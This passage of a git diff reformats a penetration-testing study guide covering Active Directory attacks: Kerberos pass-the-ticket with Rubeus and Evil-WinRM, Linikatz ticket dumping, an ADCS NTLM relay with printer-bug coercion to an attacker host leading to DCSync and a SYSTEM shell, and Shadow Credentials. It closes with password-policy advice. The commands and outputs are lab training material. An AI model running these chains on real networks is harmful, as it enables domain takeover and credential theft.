-#     }
+[realms]
+    <CORP.RTH> = {
+        kdc = dc01.<corp.rth>
+    }
 
-# ...
+...
 ```
 
-**Use Evil-WinRM with Kerberos**
+</td>
+</tr>
+</table>
+
+2. **Use** Evil-WinRM with Kerberos.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 proxychains evil-winrm -i dc01 -r <corp.rth>
 ```
-```bash
-# [proxychains] config file found: /etc/proxychains.conf
-# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-# [proxychains] DLL init: proxychains-ng 4.14
 
-# Evil-WinRM shell v3.3
-# ...
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+
+Evil-WinRM shell v3.3
+...
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
 ```
 
-**Confirm current user**
+</td>
+</tr>
+</table>
+
+3. **Confirm** current user and host.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`*Evil-WinRM* PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
-*Evil-WinRM* PS C:\Users\julio\Documents> whoami
+whoami
+hostname
 ```
-```powershell
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 <corp.rth>\julio
-```
-
-**Confirm current host**
-
-```powershell
-*Evil-WinRM* PS C:\Users\julio\Documents> hostname
-```
-```powershell
 DC01
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -8381,83 +9819,178 @@ DC01
 
 If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
 
-**Convert ccache to kirbi (Linux → Windows)**
+**Convert** ccache to kirbi (Linux → Windows).
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ```
-```bash
-# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
-# [*] converting ccache to kirbi...
-# [+] done
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h4>7. (Optional) Import Ticket in Windows</h4></summary>
 
-**Step 1: Import Ticket with Rubeus**
+1. **Import** Ticket with Rubeus.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 ```
-```bash
-#    ______        _
-#   (_____ \      | |
-#    _____) )_   _| |__  _____ _   _  ___
-#   |  __  /| | | |  _ \| ___ | | | |/___)
-#   | |  \ \| |_| | |_) ) ____| |_| |___ |
-#   |_|   |_|____/|____/|_____)____/(___/
 
-#   v2.1.2
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
 
 
-# [*] Action: Import Ticket
-# [+] Ticket successfully imported!
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
 ```
 
-**Step 2: Verify Ticket with klist**
+</td>
+</tr>
+</table>
+
+2. **Verify** Ticket with klist.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 klist
 ```
-```bash
-# Current LogonId is 0:0x31adf02
 
-# Cached Tickets: (1)
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-# #0>     Client: julio @ <CORP.RTH>
-#         Server: krbtgt/<CORP.RTH> @ <CORP.RTH>
-#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-#         Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
-#         Start Time: 10/10/2025 5:46:02 (local)
-#         End Time:   10/10/2025 15:46:02 (local)
-#         Renew Time: 10/11/2025 5:46:02 (local)
-#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
-#         Cache Flags: 0x1 -> PRIMARY
-#         Kdc Called:
+---
 
 ```
+Current LogonId is 0:0x31adf02
 
-**Step 3: Access Network Share**
+Cached Tickets: (1)
+
+#0>     Client: julio @ <CORP.RTH>
+        Server: krbtgt/<CORP.RTH> @ <CORP.RTH>
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
+        Start Time: 10/10/2025 5:46:02 (local)
+        End Time:   10/10/2025 15:46:02 (local)
+        Renew Time: 10/11/2025 5:46:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+</td>
+</tr>
+</table>
+
+3. **Access** Network Share.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 dir \\dc01\julio
 ```
-```bash
-#  Volume in drive \\dc01\julio has no label.
-#  Volume Serial Number is B8B3-0D72
 
-#  Directory of \\dc01\julio
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-# 07/14/2025  07:25 AM    <DIR>          .
-# 07/14/2025  07:25 AM    <DIR>          ..
-# 07/14/2025  04:18 PM                17 julio.txt
-#                1 File(s)             17 bytes
-#                2 Dir(s)  18,161,782,784 bytes free
+---
+
 ```
+ Volume in drive \\dc01\julio has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of \\dc01\julio
+
+07/14/2025  07:25 AM    <DIR>          .
+07/14/2025  07:25 AM    <DIR>          ..
+07/14/2025  04:18 PM                17 julio.txt
+               1 File(s)             17 bytes
+               2 Dir(s)  18,161,782,784 bytes free
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -8470,18 +10003,32 @@ Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it e
 
 **Download Linikatz**
 
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td></tr>
+<tr><td width="20%">**`root@linux:~#`**</td><td>
+
 ```bash
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 chmod +x linikatz.sh
 ```
 
+</td></tr>
+</table>
+
 **Run Linikatz**
+
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td></tr>
+<tr><td width="20%">**`root@linux:~#`**</td><td>
 
 ```bash
 bash linikatz.sh
 ```
 
-```bash
+</td></tr>
+<tr><td colspan="2">---
+
+```
 #  _ _       _ _         _
 # | (_)_ __ (_) | ____ _| |_ ____
 # | | | '_ \| | |/ / _` | __|_  /
@@ -8535,7 +10082,7 @@ bash linikatz.sh
 # Valid starting       Expires              Service principal
 # 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:48:03, Flags: RIA
-#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
 # I: [kerberos-check] User Kerberos tickets
 # Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
 # Default principal: julio@<CORP.RTH>
@@ -8543,23 +10090,26 @@ bash linikatz.sh
 # Valid starting       Expires              Service principal
 # 10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/08/2022 11:32:01, Flags: FPRIA
-#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
 # Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
 # Default principal: julio@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
 # 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:55:02, Flags: FPRIA
-#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
 # Ticket cache: FILE:/tmp/krb5cc_647402606
 # Default principal: svc_workstations@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
 # 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:55:02, Flags: FPRIA
-#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
 # I: [check] KCM Kerberos tickets
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -8581,15 +10131,29 @@ Attackers can enumerate the certificate template which is used by Domain Control
 
 **Step 1: Use certipy to identify vulnerable certificate templates (e.g., `KerberosAuthentication`):**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
 ```
 
-**Step 2: Set Up NTLM Relay** 
+</td></tr>
+</table>
+
+**Step 2: Set Up NTLM Relay**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 impacket-ntlmrelayx -t http://<CA01_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
 ```
+
+</td></tr>
+</table>
 
 > **Note:** The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication.
 
@@ -8597,21 +10161,36 @@ Attackers can either wait for victims to attempt authentication against their ma
 
 **Step 3: Trigger Authentication (Printer Bug Exploit)**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
 ```
-```bash
-# [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 # [*] Attempting to trigger authentication via rprn RPC at <DC01_IP>
 # [*] Bind OK
 # [*] Got handle
 ```
 
+</td></tr>
+</table>
+
 Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for **DC01$**:
 
-```bash
-# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>ntlmrelayx — Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
+# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 # [*] Protocol Client SMTP loaded..
 # [*] Protocol Client SMB loaded..
@@ -8645,10 +10224,16 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 # [*] Certificate successfully written to file
 ```
 
+</td></tr>
+</table>
+
 We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
 
-
 **Step 4: Clone the PKINITtools repository and install the dependencies**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -8658,14 +10243,25 @@ pip3 install -r requirements.txt
 pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
 
->Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
+</td></tr>
+</table>
+
+> Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
 
 **Step 5: Request TGT with Pass-the-Certificate (inside the .venv)**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # 2025-08-04 11:19:37,153 minikerberos INFO     Loading certificate and key from file
 # INFO:minikerberos:Loading certificate and key from file
 # 2025-08-04 11:19:37,449 minikerberos INFO     Requesting TGT
@@ -8678,17 +10274,28 @@ python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/
 # INFO:minikerberos:Saved TGT to file
 ```
 
+</td></tr>
+</table>
+
 Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example:
 
 **Step 6: Perform DCSync Attack (inside the .venv)**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
 echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
 impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP>.LOCAL/DC01$'@DC01.<CORP>.LOCAL
 ```
-```bash
-# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 # [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 # [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -8697,16 +10304,27 @@ impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<
 # Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
 # Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
 # Administrator:des-cbc-md5:a1f262b50b64c46b
-# [*] Cleaning up... 
+# [*] Cleaning up...
 ```
 
+</td></tr>
+</table>
+
 **Step 7: Gain Shell Access (inside the .venv)**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_IP>
 ```
-```bash
-# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 # [*] Requesting shares on 10.129.234.174.....
 # [*] Found writable share ADMIN$
@@ -8721,6 +10339,9 @@ impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_
 # C:\Windows\system32>
 ```
 
+</td></tr>
+</table>
+
 **Result:** You’ll receive a SYSTEM shell on the domain controller.
 
 </details>
@@ -8728,21 +10349,39 @@ impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_
 <details>
 <summary><h3>Shadow Credentials (msDS-KeyCredentialLink)</h3></summary>
 
-We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. 
+We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system.
 
 **Step 1: Add the Domain Controller to /etc/hosts**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
 ```
 
+</td></tr>
+</table>
+
 **Step 2: Install `pywhisker`**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 pip3 install pywhisker
 ```
 
+</td></tr>
+</table>
+
 **Step 3: Clone and Set Up `PKINITtools`**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -8752,17 +10391,31 @@ pip3 install -r requirements.txt
 pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
 
+</td></tr>
+</table>
+
 **Step 4: Configure Kerberos (`/etc/krb5.conf`)**
 
 Edit your Kerberos config file:
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo nano /etc/krb5.conf
 ```
 
+</td></tr>
+</table>
+
 Replace its content with the following (adjust placeholders):
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>/etc/krb5.conf</b> </td></tr>
+<tr><td colspan="2">
+
+```
 [libdefaults]
     default_realm = <CORP>.LOCAL
     dns_lookup_kdc = false
@@ -8778,27 +10431,45 @@ Replace its content with the following (adjust placeholders):
     <corp>.local = <CORP>.LOCAL
 ```
 
+</td></tr>
+</table>
+
 This config is required for Kerberos tools to find the realm and KDC manually.
 
 **Step 5: Install Kerberos User Tools**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo apt install krb5-user -y
 ```
 
+</td></tr>
+</table>
+
 During installation, enter the following when prompted:
 
-* **Kerberos servers for your realm:** DC01_IP
-* **Administrative server for your realm:** DC01_IP (same)
+- **Kerberos servers for your realm:** DC01_IP
+- **Administrative server for your realm:** DC01_IP (same)
 
 **Step 6: Inject Shadow Credentials Using `pywhisker`**
 
 This generates a certificate and adds a new key credential to the victim user's account.
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u <USER> -p '<PASSWORD>' --target <TARGET_USER> --action add
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [*] Searching for the target account
 # [*] Target user found: CN=<FULL NAME>,CN=Users,DC=<corp>,DC=local
 # [*] Generating certificate
@@ -8815,14 +10486,25 @@ pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u <USER> -p '<PASSWORD>' --target <
 # [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
+</td></tr>
+</table>
+
 > **NOTE:** Make note of the generated `.pfx` file and its password.
 
 **Step 7: Use this file with `gettgtpkinit.py` to acquire a TGT as the victim**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 python3 gettgtpkinit.py -cert-pfx <FILENAME>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC01_IP> <CORP>.LOCAL/<TARGET_USER> /tmp/<TARGET_USER>.ccache
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # 2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
 # INFO:minikerberos:Loading certificate and key from file
 # 2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
@@ -8835,13 +10517,24 @@ python3 gettgtpkinit.py -cert-pfx <FILENAME>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <
 # INFO:minikerberos:Saved TGT to file
 ```
 
+</td></tr>
+</table>
+
 **Step 8: Set Kerberos Ticket Cache and Verify**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
 klist
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # Ticket cache: FILE:/tmp/<TARGET_USER>.ccache
 # Default principal: <TARGET_USER>@<CORP>.LOCAL
 
@@ -8849,18 +10542,32 @@ klist
 # 08/04/2025 15:11:12  08/05/2025 01:11:12  krbtgt/<CORP>.LOCAL@<CORP>.LOCAL
 ```
 
+</td></tr>
+</table>
+
 In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
 
 **Step 9: EvilWinRM**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 evil-winrm -i dc01.<corp>.local -r <corp>.local
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # Evil-WinRM shell v3.7
 # Info: Establishing connection to remote endpoint
 # *Evil-WinRM* PS C:\Users\<TARGET_USER>\Documents>
 ```
+
+</td></tr>
+</table>
 
 **Result:** You now have a shell as the victim user on the Domain Controller or another accessible host.
 
@@ -8903,10 +10610,10 @@ This is why **administrators and service providers establish and enforce clear s
 
 A password policy is a set of rules aimed at strengthening computer security by guiding users to create and manage strong passwords in line with organizational standards. Its scope goes beyond setting minimum requirements—it covers the entire password lifecycle, including:
 
-* Creation
-* Storage,
-* Management
-* Transmission
+- Creation
+- Storage,
+- Management
+- Transmission
 
 <details>
 <summary><h4>Password policy standards</h4></summary>
@@ -8915,13 +10622,13 @@ Due to compliance requirements and industry best practices, many organizations f
 
 Many of these standards include guidance on password policies. Some of the most common include:
 
-* [NIST SP800-63B](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf)
-* [CIS Password Policy Guide](https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide)
-* [PCI DSS](https://www.pcisecuritystandards.org/document_library/?category=pcidss&document=pci_dss)
+- [NIST SP800-63B](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf)
+- [CIS Password Policy Guide](https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide)
+- [PCI DSS](https://www.pcisecuritystandards.org/document_library/?category=pcidss&document=pci_dss)
 
 Each standard offers a different perspective on password security, and reviewing them can help inform the development of a strong, customized password policy. One area where these standards often diverge is in their approach to **password expiration**.
 
-Historically, many organizations enforced rules like “*change your password every 90 days*” in the name of security. However, modern guidance is shifting away from this approach. Today, many standards recommend disabling periodic password expiration, as it tends to encourage users to choose weaker, more predictable passwords. Instead, password changes are typically recommended only after a known or suspected compromise.
+Historically, many organizations enforced rules like “_change your password every 90 days_” in the name of security. However, modern guidance is shifting away from this approach. Today, many standards recommend disabling periodic password expiration, as it tends to encourage users to choose weaker, more predictable passwords. Instead, password changes are typically recommended only after a known or suspected compromise.
 
 </details>
 
@@ -8930,21 +10637,21 @@ Historically, many organizations enforced rules like “*change your password ev
 
 To illustrate important considerations, here is a sample password policy. It requires that all passwords:
 
-* Minimum of 8 characters.
-* Include uppercase and lowercase letters.
-* Include at least one number.
-* Include at least one special character.
-* It should not be the username.
-* It should be changed every 60 days.
+- Minimum of 8 characters.
+- Include uppercase and lowercase letters.
+- Include at least one number.
+- Include at least one special character.
+- It should not be the username.
+- It should be changed every 60 days.
 
 We should include certain blacklisted words in our password policies. These may include, but are not limited to:
 
-* The company's name
-* Common words associated with the company
-* Names of months
-* Names of seasons
-* Variations on the words "welcome" and "password"
-* Common and easily guessable words such as "password", "123456", and "abcde"
+- The company's name
+- Common words associated with the company
+- Names of months
+- Names of seasons
+- Variations on the words "welcome" and "password"
+- Common and easily guessable words such as "password", "123456", and "abcde"
 
 </details>
 
@@ -8966,15 +10673,14 @@ Once the technical controls are in place, the policy must be communicated across
 
 This tools can generate secure passwords:
 
-* [1password](https://1password.com/password-generator)
-* [Proton Password Generator](https://proton.me/pass/password-generator)
+- [1password](https://1password.com/password-generator)
+- [Proton Password Generator](https://proton.me/pass/password-generator)
 
 **Password Evaluators**
 
 This tools evaluate the strength of passwords:
 
-* [PasswordMonster](https://www.passwordmonster.com/)
-
+- [PasswordMonster](https://www.passwordmonster.com/)
 
 </details>
 
@@ -8989,14 +10695,14 @@ According to a [study conducted by NordPass](https://www.techradar.com/news/most
 
 Given this reality, we need to have strong, unique passwords for each service. Yet, it is unrealistic to expect anyone to memorize hundreds of complex credentials. This is where a password manager becomes essential. A [password manager](https://en.wikipedia.org/wiki/Password_manager) is an application that securely stores passwords and sensitive information in an encrypted database. In addition to keeping data safe, password managers offer features such as:
 
-* Password generation
-* Two-factor authentication (2FA) support 
-* Secure form filling 
-* Browser integration
-* Multi-device synchronization
-* Security alerts
-* Login Autocomplete
-* Import and export capabilities
+- Password generation
+- Two-factor authentication (2FA) support
+- Secure form filling
+- Browser integration
+- Multi-device synchronization
+- Security alerts
+- Login Autocomplete
+- Import and export capabilities
 
 <details>
 <summary><h3>How does a password manager work?</h3></summary>
@@ -9014,19 +10720,19 @@ A cloud-based password manager allows users to synchronize their encrypted passw
 
 This approach supports Zero-Knowledge Encryption, which ensures that no one, not even the service provider, can access your secured data. To illustrate this, let's examine an approach to password derivation:
 
-* **Master key:** Derived from the master password using a key derivation function.
-* **Master password hash:** Generated using the master password (and often the master key) to authenticate the user to the cloud service.
-* **Decryption key:** Created using the master key to form a symmetric key, which is then used to decrypt vault items.
+- **Master key:** Derived from the master password using a key derivation function.
+- **Master password hash:** Generated using the master password (and often the master key) to authenticate the user to the cloud service.
+- **Decryption key:** Created using the master key to form a symmetric key, which is then used to decrypt vault items.
 
 Some of the most popular cloud password managers are:
 
-* [1Password](https://1password.com/)
-* [Bitwarden](https://bitwarden.com/)
-* [Dashlane](https://www.dashlane.com/)
-* [Keeper](https://www.keepersecurity.com/)
-* [Lastpass](https://www.lastpass.com/)
-* [NordPass](https://nordpass.com/)
-* [RoboForm](https://www.roboform.com/)
+- [1Password](https://1password.com/)
+- [Bitwarden](https://bitwarden.com/)
+- [Dashlane](https://www.dashlane.com/)
+- [Keeper](https://www.keepersecurity.com/)
+- [Lastpass](https://www.lastpass.com/)
+- [NordPass](https://nordpass.com/)
+- [RoboForm](https://www.roboform.com/)
 
 </details>
 
@@ -9039,10 +10745,10 @@ Local password managers use encryption methods similar to those of cloud-based i
 
 Some of the most widely used local password managers are:
 
-* [KeePass](https://keepass.info/)
-* [KWalletManager](https://apps.kde.org/kwalletmanager5/)
-* [Pleasant Password Server](https://pleasantpasswords.com/)
-* [Password Safe](https://pwsafe.org/)
+- [KeePass](https://keepass.info/)
+- [KWalletManager](https://apps.kde.org/kwalletmanager5/)
+- [Pleasant Password Server](https://pleasantpasswords.com/)
+- [Password Safe](https://pwsafe.org/)
 
 </details>
 
@@ -9051,12 +10757,12 @@ Some of the most widely used local password managers are:
 
 By default, most operating systems and applications are built around password based authentication. However, administrators can adopt third-party identity providers or applicationss to enhance identity protection. Some of the most common alternatives include:
 
-* [Multi-factor Authentication (MFA)](https://en.wikipedia.org/wiki/Multi-factor_authentication)
-* [FIDO2](https://fidoalliance.org/passkeys/), an open authentication standard that enables passwordless logins using physical devices like [YubiKey](https://www.yubico.com/). For a broader list of devices, see [Microsoft’s supported FIDO2 providers](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-passwordless#fido2-security-key-providers).
-* [One-Time Passwords (OTP)](https://en.wikipedia.org/wiki/One-time_password)
-* [Time-Based One-Time Passwords (TOTP)](https://en.wikipedia.org/wiki/Time-based_one-time_password)
-* [IP restrictions](https://news.gandi.net/en/2019/05/using-ip-restriction-to-help-secure-your-account/)
